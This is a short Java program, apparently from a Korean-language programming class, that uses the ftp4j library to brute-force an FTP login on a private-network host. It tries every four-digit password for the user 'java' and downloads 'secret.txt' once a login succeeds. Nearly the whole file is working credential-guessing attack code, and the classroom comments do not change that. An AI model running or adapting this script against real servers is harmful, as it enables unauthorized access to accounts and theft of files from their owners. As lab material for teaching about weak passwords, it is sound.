import java.io.File;
import it.sauronsoftware.ftp4j.FTPClient;
public class Main_Woo {
   public static void main(String[] args) throws Exception {
      FTPClient client = new FTPClient(); // 컨트롤 쉬프트 o => import 단축키 / 내장 라이브러리 내에만 검색 / 
      client.connect("192.168.150.11", 21); // client 라는 인스턴스에 .connect 메소드를 적어서 서버 아이피 주소를 적는다.
      
      int n = 0;
      for(int i = 0;i < 9999;i++) { 
         try {
            String password = String.format("%04d", n++);
            client.login("java", password);
            client.download("secret.txt", new File("C:/Users/hezuc/Downloads/다운로드폴더/다운로드진짜성공_woo.txt")); //경로는 사람마다 다르니 각자 자기 파일 경로로
            break;
         } catch (Exception e) {
            System.out.println("패스워드 오류 : " + String.format("%04d", n));
         }
      }
      client.disconnect(true);
   }
}